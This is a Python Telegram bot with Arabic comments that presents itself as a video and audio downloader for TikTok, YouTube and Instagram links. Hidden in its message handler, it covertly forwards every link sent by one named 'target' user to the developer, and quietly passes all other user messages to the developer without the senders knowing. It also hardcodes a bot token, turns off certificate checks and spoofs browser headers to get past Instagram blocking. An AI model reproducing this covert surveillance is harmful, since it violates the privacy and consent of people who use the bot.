 import os
import yt_dlp
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# --- الإعدادات الأساسية ---
TOKEN = "8471320360:AAHrI1iS4e4RNxs3AVUvplh1cA1pfI0XcsI"
ADMIN_ID = 1420457711  # أيديك أنت المطور
TARGET_USER_ID = 2034540192 # أيدي الشخص المراقب

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("هلا بيك! دزلي رابط (تيك توك، يوتيوب، ستوري إنستا) وتدلل 🎤📹")

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text
    user = update.effective_user
    
    if text.startswith("http"):
        # رادار المراقبة للشخص المطلوب
        if user.id == TARGET_USER_ID:
            await context.bot.send_message(chat_id=ADMIN_ID, text=f"🎯 الهدف دز رابط:\n🔗 {text}")
        
        await update.message.reply_text("جا يحمل صبر نتكم خره 🙂")
        
        try:
            # إعدادات الـ "الوحش" لتجاوز حظر إنستقرام
            ydl_opts = {
                'format': 'best',
                'outtmpl': f'file_{user.id}.%(ext)s',
                'quiet': True,
                'no_warnings': True,
                'ignoreerrors': True,
                'nocheckcertificate': True,
                'extractor_args': {'instagram': {'check_headers': True}},
                'add_header': [
                    'User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
                    'Accept: */*',
                    'Accept-Language: en-US,en;q=0.9',
                    'Origin: https://www.instagram.com',
                    'Referer: https://www.instagram.com/',
                ]
            }

            with yt_dlp.YoutubeDL(ydl_opts) as ydl:
                info = ydl.extract_info(text, download=True)
                if not info:
                    raise Exception("Fail")
                
                filename = ydl.prepare_filename(info)
                title = info.get('title', 'محتوى جديد')

            # إرسال الفيديو والبصمة
            with open(filename, 'rb') as f:
                await context.bot.send_video(chat_id=update.message.chat_id, video=f, caption=f"✅ {title}")
            with open(filename, 'rb') as f:
                await context.bot.send_voice(chat_id=update.message.chat_id, voice=f, caption="🎤 بصمة الصوت")
            
            os.remove(filename)
                
        except Exception:
            await update.message.reply_text("❌ إنستقرام مانع التحميل حالياً للسيرفرات.. جرب تيك توك أو يوتيوب!")

    else:
        # رسالة سرية للمطور (سكتة)
        await context.bot.send_message(chat_id=ADMIN_ID, text=f"📩 رسالة من {user.first_name}:\n💬 {text}")

if __name__ == '__main__':
    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    app.run_polling()
       
